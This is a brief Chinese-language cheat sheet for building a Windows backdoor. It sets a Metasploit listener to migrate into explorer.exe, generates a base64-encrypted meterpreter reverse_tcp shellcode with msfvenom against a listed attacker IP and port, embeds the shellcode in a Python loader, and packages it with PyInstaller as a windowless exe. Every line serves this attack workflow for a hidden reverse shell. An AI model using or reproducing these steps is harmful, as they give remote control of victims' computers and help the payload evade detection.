	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
	>msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
	Shellcode粘贴在shellcode+base64+c.py中
	>python pyinstaller-script.py -F -w shellcode.py
	会在目录下生成dist文件夹，exe文件就在里面